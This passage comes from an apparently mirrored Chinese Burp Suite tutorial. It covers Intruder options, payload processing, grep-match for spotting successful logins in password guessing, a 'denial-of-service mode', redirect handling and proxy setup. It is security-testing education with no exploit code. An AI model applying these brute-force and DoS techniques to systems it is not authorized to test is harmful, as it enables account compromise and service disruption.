将替换匹配特定正则表达式的有效载荷的任何部位，用一个文字字符串表示。</span><br><span class=\"line\">Substring - 提取的有效载荷的子部分中，从指定的偏移量（0-索引）和至所指定的长度开始。</span><br><span class=\"line\">Reverse substring - 对于子规则来说，最终的偏移量指定的有效载荷的末尾向后计数，并且长度从端部向后偏移计数。</span><br><span class=\"line\">Modify case - 这个修改了的有效载荷的情况下，如果适用的话。同样的选项作为的情况下修改有效载荷类型。</span><br><span class=\"line\">Encode - URL，HTML，Base64的，ASCII码或十六进制字符串构建各种平台：采用不同的计划，该编码的有效载荷。</span><br><span class=\"line\">Hash - hash</span><br><span class=\"line\">Add raw payload - 这之前或之后，在当前处理的值增加了原始负载值。它可以是有用的，例如，如果你需要提交相同的有效载荷在raw和哈希表。</span><br><span class=\"line\">Skip raw payload - 将检查是否当前处理的值匹配指定的正则表达式，如果是这样，跳过有效载荷和移动到下一个。这可能是有用的，例如，如果知道一个参数值必须有一个最小长度和要跳过的一个列表，比这更短的长度的任何值。</span><br><span class=\"line\">Invoke Burp extension - 调用一个Burp exxtension(扩展)来处理负载。扩展名必须已注册入侵者有效载荷处理器。您可以从已注册的当前加载的扩展可用的处理器列表中选择所需的处理器。</span><br></pre></td></tr></table></figure>\n\n<p>是规则的以下类型：</p>\n<h4 id=\"2-Payload-Encoding\"><a href=\"#2-Payload-Encoding\" class=\"headerlink\" title=\"2)Payload Encoding\"></a>2)Payload Encoding</h4><p>你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。…</p>\n<h3 id=\"Optins\"><a href=\"#Optins\" class=\"headerlink\" title=\"Optins\"></a>Optins</h3><p>此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p>\n<h4 id=\"Request-Headers-1\"><a href=\"#Request-Headers-1\" class=\"headerlink\" title=\"Request Headers\"></a>Request Headers</h4><p>这些设置控制在攻击Intruder(入侵者)是否更新配置请求头。请注意，您可以完全控制请求头通过在Payload positions(有效载荷位置)标签的要求范围内。这些选项可以用来更新每个请求的报头的方式，通常是有帮助的。</p>\n<p>下列选项可用：</p>\n<p>Update Content-length header(更新Content-Length头) - 此选项使Intruder(入侵者)添加或更新的Content-Length头的每个请求，与该特定请求的HTTP体的长度正确的值。此功能通常用于该插入可变长度的有效载荷送入模板的HTTP请求的主体的攻击至关重要。如果未指定正确的值，则目标服务器可能会返回一个错误，可能不完全响应请求，或者可能无限期地等待在请求继续接收数据。</p>\n<p>Set Connection:close(设置连接：关闭) - 此选项使Intruder(入侵者)添加或更新连接头的值为“close(关闭)” 。在某些情况下（当服务器本身并不返回一个有效的Content-Length或Transfer-Encoding头） ，这个选项可以让攻击更快速地执行。</p>\n<h4 id=\"Request-Engine\"><a href=\"#Request-Engine\" class=\"headerlink\" title=\"Request Engine\"></a>Request Engine</h4><p>设置控制用于发出HTTP请求中的Intruder(入侵者)攻击的Engine(引擎)。下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Number of threads(执行进程数) - [专业版]该选项控制并发请求数的攻击。</span><br><span class=\"line\">Number of retries on network failure(网络故障的重试次数) - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。</span><br><span class=\"line\">Pause before retry(重试前暂停) - 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位） ，然后重试失败以下。如果服务器被宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。</span><br><span class=\"line\">Throttle between requests(请求之间的节流) - Burp可以在每次请求之前等待一个指定的延迟（以毫秒为单位） 。此选项很有用，以避免超载应用程序，或者是更隐蔽。或者，您可以配置一个可变延迟（与给定的初始值和增量） 。这个选项可以是有用的测试应用程序执行的会话超时时间间隔。</span><br><span class=\"line\">Start time(开始时间) - 此选项允许您配置攻击立即启动，或在指定的延迟后，或开始处于暂停状态。如果攻击被配置，将在未来的某个时刻以供将来使用被执行，或保存这些替代品可能是有用的。</span><br></pre></td></tr></table></figure>\n\n<p>小心使用这些选项可让您微调攻击引擎，这取决于对应用程序性能的影响，并在自己的处理能力和带宽。如果您发现该攻击运行缓慢，但应用程序表现良好和你自己的CPU利用率很低，可以增加线程数，使你的攻击进行得更快。如果您发现连接错误发生，该应用程序正在放缓，或者说自己的电脑被锁定了，你应该减少线程数，也许增加网络故障和重试之间的间隔重试的次数。</p>\n<h4 id=\"Attack-Results\"><a href=\"#Attack-Results\" class=\"headerlink\" title=\"Attack Results\"></a>Attack Results</h4><p>这些设置控制哪些信息被捕获的攻击效果。下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Store requests/responses(存储请求/响应) - 这些选项确定攻击是否会保存单个请求和响应的内容。保存请求和响应占用磁盘空间，在你的临时目录中，但可以让您在攻击期间在众目睽睽这些，如果有必要重复单个请求，并将其发送到其他Burp工具。</span><br><span class=\"line\">Make unmodified baseline request(未修改的基本请求) - 如果选择此选项，那么除了配置的攻击请求，Burp会发出模板请求设置为基值，所有有效载荷的位置。此请求将在结果表显示为项目＃ 0 。使用此选项很有用，提供一个用来比较的攻击响应基地的响应。</span><br><span class=\"line\">Use denial-of-service mode(使用拒绝服务的模式) - 如果选择此选项，那么攻击会发出请求，如正常，但不会等待处理从服务器收到任何答复。只要发出的每个请求， TCP连接将被关闭。这个功能可以被用来执行拒绝服务的应用层对脆弱的应用程序的攻击，通过重复发送该启动高负荷任务的服务器上，同时避免通过举办开放套接字等待服务器响应锁定了本地资源的请求。</span><br><span class=\"line\">Store full payloads(保存完整的有效载荷) - 如果选择此选项，Burp将存储全部有效载荷值的结果。此选项会占用额外的内存，但如果你想在运行时执行某些操作，如修改payload grep setting(有效负载值设置)，或重新发出请求与修改请求模板可能需要。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Grep-Match\"><a href=\"#Grep-Match\" class=\"headerlink\" title=\"Grep-Match\"></a>Grep-Match</h4><p>设置可用于包含在响应中指定的表达式标志结果的项目。对于配置列表中的每个项目，Burp会添加一个包含一个复选框，指出项目是否被发现在每个响应的新成果列。然后，您可以到组排序此列（通过单击列标题）匹配的结果相加。</p>\n<p>使用此选项可以是非常强大的，帮助分析大套的成绩，并迅速找出有趣的项目。例如，在口令猜测攻击，扫描短语，如“password incorrect(密码不正确)”或“login successful(登录成功)”，可以找到成功登录;在测试SQL注入漏洞，扫描含有“ ODBC ” ， “error(错误)”等消息可以识别易受攻击的参数。</p>\n<p>除了表达式匹配的列表，下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Match(匹配类型) - 指定的表达式是否是简单的字符串或regular expressions(正则表达式)。</span><br><span class=\"line\">Case sensitive match(区分大小写的匹配) - 指定检查表达式是否应区分大小写。</span><br><span class=\"line\">Exclude HTTP headers(不包括HTTP头) - 指定的HTTP响应头是否应被排除在检查。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Grep-Extrack\"><a href=\"#Grep-Extrack\" class=\"headerlink\" title=\"Grep-Extrack\"></a>Grep-Extrack</h4><p>可以被用来Extrack(提取)从反应有用的信息进入攻击结果的表。对于配置列表中的每个项目，Burp会添加一个包含提取该项目的文本的新成果列。然后，您可以排序此列（通过单击列标题）命令所提取的数据。例如我要匹配</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122144357.png\" alt=\"Image123\" title=\"image123.png\"></p>\n<p>information_schema这个表。则可以这样写，都是需要匹配唯一的那种，也可以使用正则，前提是你会写正则。在乌云社区有人提起过当时怎么匹配手机号，就可以从这里提取。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122149847.png\" alt=\"Image125\" title=\"image125.png\"></p>\n<h4 id=\"Grep-Payloads\"><a href=\"#Grep-Payloads\" class=\"headerlink\" title=\"Grep-Payloads\"></a>Grep-Payloads</h4><p>设置可用于含有所提交的有效载荷的反射标志的结果项。如果启用该选项，Burp会添加一个包含一个复选框，指示当前负载的值是否被发现在每个响应的新成果列。 （如果使用一个以上的有效载荷，单独的列将每个有效载荷集加。 ）</p>\n<p>此功能可以在检测跨站点脚本和其他应对注入漏洞，它可以出现在用户输入动态地插入到应用程序的响应是有用的。</p>\n<p>下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Case sensitive match(区分大小写的匹配) - 指定检查payload(负载)是否应区分大小写。</span><br><span class=\"line\">Exclude HTTP headers(不包括HTTP头) - 这指定的HTTP响应头是否应被排除在检查。</span><br><span class=\"line\">Match against pre-URL-encoded payloads(对预URL编码的有效载荷匹配) - 这是正常的配置Inturder(入侵者)请求中URL编码的有效载荷。然而，这些通常是由应用程序解码，回荡在他们的原始形式。您可以使用此选项，以用于有效载荷Burp检查反应在他们的预编码形式。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Redirections\"><a href=\"#Redirections\" class=\"headerlink\" title=\"Redirections\"></a>Redirections</h4><p>控制Burp在进行攻击时如何处理重定向。它往往是要遵循重定向来实现你的攻击目标。例如，在一个口令猜测攻击，每一次尝试的结果可能只能通过下面的重定向显示。模糊测试的时候，相关的反馈可能只出现在最初的重定向响应后返回的错误消息。</p>\n<p>下列选项可用： Follow redirections(跟随重定向) - 控制重定向都遵循的目标。下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)Never(从来没有) - 入侵者不会遵循任何重定向。</span><br><span class=\"line\">2)On-site only(现场唯一的) - 入侵者只会跟随重定向到同一个网页“网站” ，即使用相同的主机，端口和协议的是在原始请求使用的URL 。</span><br><span class=\"line\">3)In-scope only(调查范围内的唯一) - Intruder只会跟随重定向到该套件范围的目标范围之内的URL 。</span><br><span class=\"line\">4)Always(总是) - Intruder将遵循重定向到任何任何URL 。您应使用此选项时应谨慎 - 偶尔， Web应用程序在中继重定向到第三方的请求参数，并按照重定向你可能会不小心攻击。</span><br></pre></td></tr></table></figure>\n\n<p>Process cookies in redirections(过程中的Cookie重定向) - 如果选择此选项，然后在重定向响应设置任何cookies将被当重定向目标之后重新提交。例如，如果你正在尝试暴力破解登录的挑战就可能是必要的，它总是返回一个重定向到一个页面显示登录的结果，和一个新的会话响应每个登录尝试创建。</p>\n<p>Burp会跟进到10链重定向，如果必要的。在结果表中的列将显示重定向是否其次为每个单独的结果，以及完整的请求和响应中的重定向链存储与每个结果的项目。重定向的类型Burp会处理（ 3xx的状态码，刷新头，等）配置在一套全重定向选项。</p>\n<p>注意重定向： 在某些情况下，可能需要下面的重定向时只使用一个单线程的攻击。出现这种情况时，应用程序存储会话中的初始请求的结果，并提供重定向响应时检索此。</p>\n<p>自动下重定向有时可能会造成问题 - 例如，如果应用程序响应一个重定向到注销页面的一些恶意的请求，那么下面的重定向可能会导致您的会话被终止时，它原本不会这么做。</p>\n<h3 id=\"Attacks\"><a href=\"#Attacks\" class=\"headerlink\" title=\"Attacks\"></a>Attacks</h3><p>当你配置完你的攻击设置时，你需要launch the attacks(发起攻击)，analyze the results(分析结果)，有时修改攻击配置，与您的测试工作流程链接，或进行其他操作。</p>\n<h4 id=\"Launching-an-Attack\"><a href=\"#Launching-an-Attack\" class=\"headerlink\" title=\"Launching an Attack\"></a>Launching an Attack</h4><p>攻击可以通过两种方式启动：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)您可以配置Target(目标)，Positions(位置)，Payloads(有效载荷)和Options(选项卡)的攻击设置，然后选择从Intruder(入侵者)菜单“Start attack(开始攻击)”。 </span><br><span class=\"line\">2)您可以通过从Intruder menu(入侵者菜单)中选择“previously saved attack(打开保存的攻击)”打开以前保存的攻击。 </span><br></pre></td></tr></table></figure>\n\n<p>在单独的窗口中每次攻击会打开。该窗口显示攻击为它们生成的结果，使您能够修改攻击配置实时，并与您的测试工作流程链接，或进行其他操作。</p>\n<h4 id=\"Result-Tab\"><a href=\"#Result-Tab\" class=\"headerlink\" title=\"Result Tab\"></a>Result Tab</h4><p>在结果选项卡包含在攻击发出的每个请求的全部细节。你可以过滤并标注此信息来帮助分析它，并使用它来驱动您的测试工作流程。</p>\n<h4 id=\"1-Results-Table\"><a href=\"#1-Results-Table\" class=\"headerlink\" title=\"1)Results Table\"></a>1)Results Table</h4><p>Results Table显示已在attack中所有的请求和响应的详细信息。根据不同的攻击配置，表可能包含以下几列，其中一些是默认隐藏的，可以使用Columns菜单 中取消隐藏：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122190859.png\" alt=\"Image127\" title=\"image127.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122295512.png\" alt=\"Image129\" title=\"image129.png\"></p>\n<p>request 请求数 Position 有效载荷位置编号 Payload 有效载荷 Status http状态 Error 请求错误 Timeout 超时 Length 字节数 Comment 注释</p>\n<h4 id=\"2-Display-Filter\"><a href=\"#2-Display-Filter\" class=\"headerlink\" title=\"2)Display Filter\"></a>2)Display Filter</h4><p>结果选项卡，可以用来隐藏某些内容从视图中，以使其更易于分析和对你感兴趣的工作内容显示过滤在结果表中。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122263054.png\" alt=\"Image131\" title=\"image131.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Search term(检索词) - [专业版]您可以筛选反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“negative search(消极搜索)”选项，然后不匹配的搜索词唯一的项目将被显示。</span><br><span class=\"line\">Status code(状态代码) - 您可以配置是否要显示或隐藏各种HTTP状态码响应。</span><br><span class=\"line\">Annotation(注释) - 您可以设定是否显示使用用户提供的评论或只重点项目。在结果表中显示的内容实际上是一个视图到基础数据库，并显示过滤器控制什么是包含在该视图。如果设置一个过滤器，隐藏一些项目，这些都没有被删除，只是隐藏起来，如果你取消设置相关的过滤器将再次出现。这意味着您可以使用筛选器来帮助您系统地研究一个大的结果集（例如，从模糊测试包含许多参数的要求）来理解各种不同的有趣的响应出现。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Attack-configuration-Tabs\"><a href=\"#Attack-configuration-Tabs\" class=\"headerlink\" title=\"Attack configuration Tabs\"></a>Attack configuration Tabs</h3><p>在结果选项卡中，攻击窗口包含每个从它目前的攻击是基于主界面的配置选项卡中的克隆。这使您能够查看和修改攻击配置，同时进攻正在进行中。有关进一步详情，请参阅各配置选项卡的帮助：目标职位有效载荷选项当修改一个跑动进攻的配置，以下几点值得关注：攻击结构的某些部分是基本的攻击（如攻击类型和有效载荷类型）的结构，并且攻击已经开始之后不能改变。改变配置的某些部分攻击正在运行时，可能会有意想不到的效果。</p>\n<p>例如，如果您使用的是数量的有效载荷和编辑字段中，然后更改才会生效，因为每个键被按下;如果你最初从删除数字字段中，那么攻击可能会突然完成，因为要字段现在包含一个较小的数字。我们强烈建议您暂停修改它们的配置运行前的攻击。</p>\n<h3 id=\"Result-Menus\"><a href=\"#Result-Menus\" class=\"headerlink\" title=\"Result Menus\"></a>Result Menus</h3><p>结果视图包含几个菜单命令与控制的攻击，并进行其他操作。这些将在下面说明。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122362902.png\" alt=\"Image133\" title=\"image133.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122330940.png\" alt=\"Image135\" title=\"image135.png\"></p>\n<h4 id=\"1-Attack-Menu-攻击菜单\"><a href=\"#1-Attack-Menu-攻击菜单\" class=\"headerlink\" title=\"1)Attack Menu(攻击菜单)\"></a>1)Attack Menu(攻击菜单)</h4><p>包含的命令pause(暂停)，resume(继续)或repeat(重复)攻击。</p>\n<h4 id=\"2）Save-Menu-保存菜单\"><a href=\"#2）Save-Menu-保存菜单\" class=\"headerlink\" title=\"2）Save Menu(保存菜单)\"></a>2）Save Menu(保存菜单)</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">attack - 这是用来保存当前攻击的副本，包括结果。保存的文件可以使用从主Burp的UI Intruder菜单中的“打开保存的攻击”选项来重新加载。</span><br><span class=\"line\">Results table - 这是用于对结果表保存为一个文本文件。你可以选择保存的所有行，或仅选定的行。您也可以选择要包括的列，列分隔符。此功能是有用的导出结果到电子表格中，以便进一步分析，或用于保存单个列（如使用提取的grep函数挖掘数据），以用作用于随后的攻击或其它工具的输入文件。</span><br><span class=\"line\">Server responses - 这是用于保存收到的所有请求的全部应答。这些既可以被保存在单独的文件中（顺序编号）或串行级联的序列转换成一个单一的文件。</span><br><span class=\"line\">Attack configuration - 这是用来保存当前正在执行攻击的配置（而不是结果）。您可以重新使用从主Burp的UI Intruder菜单中的“加载配置攻击”选项，攻击配置。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-Columns-Menu-列菜单\"><a href=\"#3-Columns-Menu-列菜单\" class=\"headerlink\" title=\"3)Columns Menu(列菜单)\"></a>3)Columns Menu(列菜单)</h4><p>这使您可以选择哪些可用的列是可见的攻击结果表。<br></style></p>\n","cover_type":"img","excerpt":"<hr>\n<p>Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。本文主要介绍它的以下特点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.Target(目标)——显示目标目录结构的的一个功能</span><br><span class=\"line\">2.Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</span><br><span class=\"line\">3.Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</span><br><span class=\"line\">4.Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。</span><br><span class=\"line\">5.Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</span><br><span class=\"line\">6.Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。</span><br><span class=\"line\">7.Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</span><br><span class=\"line\">8.Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。</span><br><span class=\"line\">9.Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</span><br><span class=\"line\">10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</span><br><span class=\"line\">11.Options(设置)——对Burp Suite的一些设置</span><br></pre></td></tr></table></figure>","more":"<h2 id=\"测试工作流程\"><a href=\"#测试工作流程\" class=\"headerlink\" title=\"测试工作流程\"></a>测试工作流程</h2><p>Burp支持手动的Web应用程序测试的活动。它可以让你有效地结合手动和自动化技术，使您可以完全控制所有的BurpSuite执行的行动，并提供有关您所测试的应用程序的详细信息和分析。 让我们一起来看看Burp Suite的测试流程过程吧。 如下图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120074380.png\" alt=\"Image001\" title=\"image001.png\"></p>\n<h2 id=\"简要分析\"><a href=\"#简要分析\" class=\"headerlink\" title=\"简要分析\"></a>简要分析</h2><p>代理工具可以说是Burp Suite测试流程的一个心脏，它可以让你通过浏览器来浏览应用程序来捕获所有相关信息，并让您轻松地开始进一步行动，在一个典型的测试中，侦察和分析阶段包括以下任务：</p>\n<p>手动映射应用程序-使用浏览器通过BurpSuite代理工作，手动映射应用程序通过以下链接，提交表单，并通过多步骤的过程加强。这个过程将填充代理的历史和目标站点地图与所有请求的内容，通过被动蜘蛛将添加到站点地图，可以从应用程序的响应来推断任何进一步的内容(通过链接、表单等)。也可以请求任何未经请求的站点(在站点地图中以灰色显示的)，并使用浏览器请求这些。</p>\n<p>在必要是执行自动映射-您可以使用BurpSuite自动映射过程中的各种方法。可以进行自动蜘蛛爬行，要求在站点地图未经请求的站点。请务必在使用这个工具之前，检查所有的蜘蛛爬行设置。</p>\n<p>使用内容查找功能发现，可以让您浏览或蜘蛛爬行可见的内容链接以进一步的操作。</p>\n<p>使用BurpSuite Intruder(入侵者)通过共同文件和目录列表执行自定义的发现，循环，并确定命中。</p>\n<p>注意，在执行任何自动操作之前，可能有必要更新的BurpSuite的配置的各个方面，诸如目标的范围和会话处理。</p>\n<p>分析应用程序的攻击面 - 映射应用程序的过程中填入代理服务器的历史和目标站点地图与所有的BurpSuite已抓获有关应用程序的信息。这两个库中包含的功能来帮助您分析它们所包含的信息，并评估受攻击面的应用程序公开。此外，您可以使用BurpSuite的目标分析器报告的攻击面的程度和不同类型的应用程序使用的URL 。</p>\n<p>接下来主要介绍下BurpSuite的各个功能吧。先介绍Proxy功能，因为Proxy起到一个心脏功能，所有的应用都基于Proxy的代理功能。</p>\n<h2 id=\"Burp-Suite功能按钮键翻译对照\"><a href=\"#Burp-Suite功能按钮键翻译对照\" class=\"headerlink\" title=\"Burp Suite功能按钮键翻译对照\"></a>Burp Suite功能按钮键翻译对照</h2><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>### 导航栏</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Burp</td>\n<td>BurpSuite</td>\n<td>save state wizard</td>\n<td>保存状态向导</td>\n</tr>\n<tr>\n<td>restore state</td>\n<td>恢复状态</td>\n<td>Remember setting</td>\n<td>记住设置</td>\n</tr>\n<tr>\n<td>restore defaults</td>\n<td>恢复默认</td>\n<td>Intruder</td>\n<td>入侵者</td>\n</tr>\n<tr>\n<td>Start attack</td>\n<td>开始攻击(爆破)</td>\n<td>Actively scan defined insertion points</td>\n<td>定义主动扫描插入点</td>\n</tr>\n<tr>\n<td>Repeater</td>\n<td>中继器</td>\n<td>New tab behavior</td>\n<td>新标签的行为</td>\n</tr>\n<tr>\n<td>Automatic payload positions</td>\n<td>自动负载位置</td>\n<td>config predefined payload lists</td>\n<td>配置预定义的有效载荷清单</td>\n</tr>\n<tr>\n<td>Update content-length</td>\n<td>更新内容长度</td>\n<td>unpack gzip&#x2F;deflate</td>\n<td>解压gzip&#x2F;放弃</td>\n</tr>\n<tr>\n<td>Follow redirections</td>\n<td>跟随重定向</td>\n<td>process cookies in redirections</td>\n<td>在重定向过程中的cookies</td>\n</tr>\n<tr>\n<td>View</td>\n<td>视图</td>\n<td>Action</td>\n<td>行为</td>\n</tr>\n<tr>\n<td>### 功能项</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Target</td>\n<td>目标</td>\n<td>Proxy</td>\n<td>代理</td>\n</tr>\n<tr>\n<td>Spider</td>\n<td>蜘蛛</td>\n<td>Scanner</td>\n<td>扫描</td>\n</tr>\n<tr>\n<td>Intruder</td>\n<td>入侵者</td>\n<td>Repeater</td>\n<td>中继器</td>\n</tr>\n<tr>\n<td>Sequencer</td>\n<td>定序器</td>\n<td>Decoder</td>\n<td>解码器</td>\n</tr>\n<tr>\n<td>Comparer</td>\n<td>比较器</td>\n<td>Extender</td>\n<td>扩展</td>\n</tr>\n<tr>\n<td>Options</td>\n<td>设置</td>\n<td>Detach</td>\n<td>分离</td>\n</tr>\n<tr>\n<td>Filter</td>\n<td>过滤器</td>\n<td>SiteMap</td>\n<td>网站地图</td>\n</tr>\n<tr>\n<td>Scope</td>\n<td>范围</td>\n<td>Filter by request type</td>\n<td>通过请求过滤</td>\n</tr>\n<tr>\n<td>Intercept</td>\n<td>拦截</td>\n<td>response Modification</td>\n<td>响应修改</td>\n</tr>\n<tr>\n<td>match and replace</td>\n<td>匹配和替换</td>\n<td>ssl pass through</td>\n<td>SSL通过</td>\n</tr>\n<tr>\n<td>Miscellaneous</td>\n<td>杂项</td>\n<td>spider status</td>\n<td>蜘蛛状态</td>\n</tr>\n<tr>\n<td>crawler settings</td>\n<td>履带式设置</td>\n<td>passive spidering</td>\n<td>被动蜘蛛</td>\n</tr>\n<tr>\n<td>form submission</td>\n<td>表单提交</td>\n<td>application login</td>\n<td>应用程序登录</td>\n</tr>\n<tr>\n<td>spider engine</td>\n<td>蜘蛛引擎</td>\n<td>scan queue</td>\n<td>扫描队列</td>\n</tr>\n<tr>\n<td>live scanning</td>\n<td>现场扫描</td>\n<td>live active scanning</td>\n<td>现场主动扫描</td>\n</tr>\n<tr>\n<td>live passive scanning</td>\n<td>现场被动扫描</td>\n<td>attack insertion points</td>\n<td>攻击插入点</td>\n</tr>\n<tr>\n<td>active scanning optimization</td>\n<td>主动扫描优化</td>\n<td>active scanning areas</td>\n<td>主动扫描区域</td>\n</tr>\n<tr>\n<td>passive scanning areas</td>\n<td>被动扫描区域</td>\n<td>Payload</td>\n<td>有效载荷</td>\n</tr>\n<tr>\n<td>payload processing</td>\n<td>有效载荷处理</td>\n<td>select live capture request</td>\n<td>选择现场捕获请求</td>\n</tr>\n<tr>\n<td>token location within response</td>\n<td>内响应令牌的位置</td>\n<td>live capture options</td>\n<td>实时捕捉选项</td>\n</tr>\n<tr>\n<td>Manual load</td>\n<td>手动加载</td>\n<td>Analyze now</td>\n<td>现在分析</td>\n</tr>\n<tr>\n<td>Platform authentication</td>\n<td>平台认证</td>\n<td>Upstream proxy servers</td>\n<td>上游代理服务器</td>\n</tr>\n<tr>\n<td>Grep Extrack</td>\n<td>提取</td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h1 id=\"Proxy功能\"><a href=\"#Proxy功能\" class=\"headerlink\" title=\"Proxy功能\"></a>Proxy功能</h1><hr>\n<p>Burp Proxy相当于BurpSuite的心脏，通过拦截，查看和修改所有的请求和响应您的浏览器与目标Web服务器之间传递。 下面了解有关BurpProxy：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120067021.png\" alt=\"Image003\" title=\"image003.png\"></p>\n<h2 id=\"Using-BurpProxy-http、https\"><a href=\"#Using-BurpProxy-http、https\" class=\"headerlink\" title=\"Using BurpProxy http、https\"></a>Using BurpProxy http、https</h2><h3 id=\"http\"><a href=\"#http\" class=\"headerlink\" title=\"http\"></a>http</h3><p>设置代理的方法：以http ie为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">工具&gt;&gt;Internet选项&gt;&gt;连接&gt;&gt;局域网&gt;&gt;勾选代理服务器填写地址127.0.0.1端口8080</span><br></pre></td></tr></table></figure>\n\n<p>这里端口可以随便定义但是要跟burp的监听端口要一致然后保存再到Proxy的Options中添加add</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120062713.jpg\" alt=\"Image005\" title=\"image005.jpg\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120053086.jpg\" alt=\"Image007\" title=\"image007.jpg\"></p>\n<p>这样http协议的监听就可以了,当intercept is on表示开启拦截功能，反之</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120574272.jpg\" alt=\"Image009\" title=\"image009.jpg\"></p>\n<p>这样就代表拦截成功，我们可以右击send to Repeater去修改数据再发送，也可以右击改变提交请求方式(change request method)比如get或者post等功能</p>\n<h3 id=\"https\"><a href=\"#https\" class=\"headerlink\" title=\"https\"></a>https</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 